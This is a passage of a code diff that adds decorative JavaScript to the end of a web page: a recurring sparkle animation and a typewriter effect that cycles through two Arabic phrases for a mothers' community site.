+  const colors = ['#e8637a','#c9956a','#f4859b','#ffd6a5','#ffafc7'];
+  s.style.cssText = `
+    right: ${Math.random()*90+5}%;
+    top: ${Math.random()*80+5}%;
+    font-size: ${10 + Math.random()*14}px;
+    color: ${colors[Math.floor(Math.random()*colors.length)]};
+    animation-duration: ${1.2 + Math.random()*1.2}s;
+  `;
+  sparkleCont.appendChild(s);
+  setTimeout(() => s.remove(), 2000);
+}
+setInterval(createSparkle, 600);
+
+/* ── 7. TYPEWRITER on hero ── */
+const typed = document.getElementById('typed-text');
+const words = ['بيبي وماما 🤱', 'مجتمع الأمهات 💕'];
+let wIndex = 0, cIndex = 0, deleting = false;
+function typeLoop() {
+  const word = words[wIndex];
+  if (!deleting) {
+    typed.textContent = word.slice(0, ++cIndex);
+    if (cIndex === word.length) { deleting = true; setTimeout(typeLoop, 2200); return; }
+  } else {
+    typed.textContent = word.slice(0, --cIndex);
+    if (cIndex === 0) { deleting = false; wIndex = (wIndex + 1) % words.length; }
+  }
+  setTimeout(typeLoop, deleting ? 60 : 100);
+}
+setTimeout(typeLoop, 800);
+</script>
+
 </body>
 </html>
